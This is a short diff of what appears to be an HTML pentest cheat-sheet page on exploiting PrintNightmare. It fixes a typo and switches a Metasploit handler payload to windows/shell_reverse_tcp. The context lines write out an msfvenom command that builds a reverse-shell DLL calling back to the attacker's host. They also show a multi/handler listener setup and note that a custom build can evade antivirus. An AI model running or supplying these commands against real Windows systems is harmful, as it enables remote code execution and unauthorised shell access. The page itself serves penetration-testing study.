@@ -1232,7 +1232,7 @@ sudo service smbd stop
 <p><a href=https://github.com/outflanknl/PrintNightmare>https://github.com/outflanknl/PrintNightmare</a></p>
 <p>Did not test this yet. But seems &lsquo;better&rsquo; then the cube0x0 implementation</p>
 <h2 id=create-dll>Create DLL</h2>
-<p>MSVenom is you think AV is not a problem. Otherwise build something custom.</p>
+<p>MSVenom if you think AV is not a problem. Otherwise build something custom.</p>
 <h3 id=msfvenom>MSFVenom</h3>
 <pre><code class=language-bash>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=&lt;YOUR IP&gt; LPORT=&lt;PORT TO LISTEN&gt; -f dll -o /home/user/Documents/printnightmare/payloads/rev.dll
 </code></pre>
@@ -1374,7 +1374,7 @@ plain_revshell.cpp
 </code></pre>
 <h5 id=msf-multi-handler>MSF multi handler</h5>
 <pre><code class=language-bash>msfconsole -x &quot;use exploit/multi/handler;\
-set payload generic/shell_reverse_tcp;\
+set payload windows/shell_reverse_tcp;\
 set LHOST 172.16.0.137;\
 set LPORT 80;\
 set ExitOnSession false;\
